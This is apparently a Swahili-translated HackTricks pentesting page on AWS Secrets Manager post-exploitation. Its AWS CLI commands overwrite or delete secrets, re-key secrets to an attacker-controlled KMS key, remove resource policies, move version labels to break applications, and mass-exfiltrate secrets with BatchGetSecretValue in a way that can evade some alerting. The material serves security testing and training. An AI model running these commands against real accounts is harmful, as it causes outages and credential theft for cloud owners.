# AWS - Secrets Manager Post Exploitation

{{#include ../../../../banners/hacktricks-training.md}}

## Secrets Manager

Kwa maelezo zaidi angalia:

{{#ref}}
../../aws-services/aws-secrets-manager-enum.md
{{#endref}}

### Soma Secrets

**secrets wenyewe ni taarifa nyeti**, [angalia ukurasa wa privesc](../../aws-privilege-escalation/aws-secrets-manager-privesc/README.md) ili ujifunze jinsi ya kuvisoma.

### DoS Badilisha Thamani ya Secret

Kubadilisha thamani ya secret kunaweza **kusababisha DoS kwa mifumo yote inayotegemea thamani hiyo.**

> [!WARNING]
> Kumbuka kwamba thamani za awali pia zinahifadhiwa, hivyo ni rahisi kurudi kwenye thamani ya awali.
```bash
# Requires permission secretsmanager:PutSecretValue
aws secretsmanager put-secret-value \
--secret-id MyTestSecret \
--secret-string "{\"user\":\"diegor\",\"password\":\"EXAMPLE-PASSWORD\"}"
```
### DoS Badilisha ufunguo wa KMS

Ikiwa mshambuliaji ana ruhusa secretsmanager:UpdateSecret, anaweza kusanidi siri ili itumie KMS key inayomilikiwa na mshambuliaji. Ufunguo huo kwa awali umewekwa kwa njia ambayo yeyote anaweza kuupata na kuutumia, hivyo kusasisha siri kwa ufunguo mpya kunawezekana. Ikiwa ufunguo haukupatikana, siri haingeweza kusasishwa.

Baada ya kubadilisha ufunguo wa siri, mshambuliaji anabadilisha usanidi wa ufunguo wake ili wao pekee waweze kuupata. Kwa hivyo, katika matoleo yajayo ya siri, yatakuwa yamefungwa kwa ufunguo mpya, na kwa kuwa hakuna mtu anayeweza kuufikia, uwezo wa kupata siri utapotea.

Ni muhimu kutambua kuwa ukosefu huu wa upatikanaji utatokea tu katika matoleo ya baadaye, baada ya yaliyomo kwenye siri kubadilika, kwa sababu toleo la sasa bado limefichwa kwa KMS key ya awali.
```bash
aws secretsmanager update-secret \
--secret-id MyTestSecret \
--kms-key-id arn:aws:kms:us-west-2:123456789012:key/EXAMPLE1-90ab-cdef-fedc-ba987EXAMPLE
```
### DoS Deleting Secret

Idadi ya chini ya siku za kufuta secret ni 7
```bash
aws secretsmanager delete-secret \
--secret-id MyTestSecret \
--recovery-window-in-days 7
```
## secretsmanager:RestoreSecret

Inawezekana kurejesha secret, jambo linalowezesha urejeshaji wa secrets zilizopangwa kufutwa, kwa kuwa kipindi kidogo cha kufuta secrets ni siku 7 na cha juu ni siku 30. Pamoja na ruhusa secretsmanager:GetSecretValue, hili linafanya iwezekane kupata maudhui yao.

Ili kurejesha secret ambayo iko katika mchakato wa kufutwa, unaweza kutumia amri ifuatayo:
```bash
aws secretsmanager restore-secret \
--secret-id <Secret_Name>
```
## secretsmanager:DeleteResourcePolicy

Kitendo hiki kinaruhusu kufuta resource policy inayodhibiti nani anaweza kufikia secret. Hii inaweza kusababisha DoS ikiwa resource policy ilikuwa imewekwa kuruhusu upatikanaji kwa kundi maalum la watumiaji.

Ili kufuta resource policy:
```bash
aws secretsmanager delete-resource-policy \
--secret-id <Secret_Name>
```
## secretsmanager:UpdateSecretVersionStage

Hali za siri hutumika kusimamia matoleo ya siri. AWSCURRENT inaonyesha toleo la sasa ambalo programu zinazitumia, AWSPREVIOUS huhifadhi toleo lililopita ili uweze kurudi nyuma ikiwa ni lazima, na AWSPENDING hutumika katika mchakato wa mzunguko kuandaa na kuthibitisha toleo jipya kabla ya kulifanya kuwa toleo la sasa.

Programu daima husoma toleo lenye AWSCURRENT. Ikiwa mtu atahamisha lebo hiyo kwa toleo lisilo sahihi, programu zitatumia vitambulisho batili na zinaweza kushindwa.

AWSPREVIOUS haitumiki kiotomatiki. Hata hivyo, ikiwa AWSCURRENT itaondolewa au itapangiwa upya kwa njia isiyo sahihi, inaweza kuonekana kwamba kila kitu bado kinaendelea kwa toleo lililopita.
```bash
aws secretsmanager update-secret-version-stage \
--secret-id <your-secret-name-or-arn> \
--version-stage AWSCURRENT \
--move-to-version-id <target-version-id> \
--remove-from-version-id <previous-version-id>
```
{{#include ../../../../banners/hacktricks-training.md}}





### Mass Secret Exfiltration via BatchGetSecretValue (up to 20 per call)

Tumia vibaya Secrets Manager BatchGetSecretValue API ili kupata hadi 20 secrets kwa ombi moja. Hii inaweza kupunguza kwa kiasi kikubwa idadi ya API-call ikilinganishwa na kurudia GetSecretValue kwa kila secret. Ikiwa vichujio (tags/name) vinatumika, ruhusa ya ListSecrets pia inahitajika. CloudTrail bado inarekodi tukio moja la GetSecretValue kwa kila secret iliyopewa kwenye batch.

Required permissions
- secretsmanager:BatchGetSecretValue
- secretsmanager:GetSecretValue for each target secret
- secretsmanager:ListSecrets if using --filters
- kms:Decrypt on the CMKs used by the secrets (if not using aws/secretsmanager)

> [!WARNING]
> Kumbuka kwamba ruhusa `secretsmanager:BatchGetSecretValue` peke yake haitoshi kupata secrets; pia unahitaji `secretsmanager:GetSecretValue` kwa kila secret unayotaka kupata.

Exfiltrate by explicit list
```bash
aws secretsmanager batch-get-secret-value \
--secret-id-list <secret1> <secret2> <secret3> \
--query 'SecretValues[].{Name:Name,Version:VersionId,Val:SecretString}'
```
Exfiltrate kwa kutumia filters (tag key/value au name prefix)
```bash
# By tag key
aws secretsmanager batch-get-secret-value \
--filters Key=tag-key,Values=env \
--max-results 20 \
--query 'SecretValues[].{Name:Name,Val:SecretString}'

# By tag value
aws secretsmanager batch-get-secret-value \
--filters Key=tag-value,Values=prod \
--max-results 20

# By name prefix
aws secretsmanager batch-get-secret-value \
--filters Key=name,Values=MyApp
```
Kushughulikia kushindwa kwa sehemu
```bash
# Inspect the Errors list for AccessDenied/NotFound and retry/adjust filters
aws secretsmanager batch-get-secret-value --secret-id-list <id1> <id2> <id3>
```
Athari
- Haraka “smash-and-grab” ya siri nyingi kwa maombi machache ya API, ambayo inaweza kuiepuka mfumo wa onyo uliolenga mionekano ya ghafla ya GetSecretValue.
- Rejista za CloudTrail bado zinajumuisha tukio moja la GetSecretValue kwa kila siri iliyopatikana katika kundi.
